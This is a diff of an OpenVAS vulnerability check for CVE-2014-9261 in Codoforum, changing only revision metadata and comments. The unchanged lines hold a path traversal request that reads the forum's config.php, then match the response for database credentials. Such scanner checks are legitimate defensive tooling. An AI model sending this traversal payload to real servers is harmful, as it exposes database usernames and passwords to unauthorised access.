@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_codoforum_arbitrary_file_download_vuln.nasl 6183 2017-05-22 09:03:43Z teissa $
+# $Id: gb_codoforum_arbitrary_file_download_vuln.nasl 11291 2018-09-07 14:48:41Z mmartin $
 #
 # Codoforum Arbitrary File Download Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:codoforum:codoforum";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805494");
-  script_version("$Revision: 6183 $");
+  script_version("$Revision: 11291 $");
   script_cve_id("CVE-2014-9261");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-22 11:03:43 +0200 (Mon, 22 May 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-07 16:48:41 +0200 (Fri, 07 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-03-17 12:08:01 +0530 (Tue, 17 Mar 2015)");
   script_name("Codoforum Arbitrary File Download Vulnerability");
   script_category(ACT_ATTACK);
@@ -71,18 +71,14 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-# Get HTTP Port
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 
-## Get Application Location
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
 if( dir == "/" ) dir = "";
 
-##Construct Attack Request
 url = dir + "/index.php?u=serve/attachment&path=../../../../../sites/default/config.php";
 
-## Try attack and check the response to confirm vulnerability
 if( http_vuln_check( port:port, url:url, check_header:TRUE,
                      pattern:"(database|username|password)", extra_check:"get_codo_db_conf" ) ) {
   report = report_vuln_url( port:port, url:url );
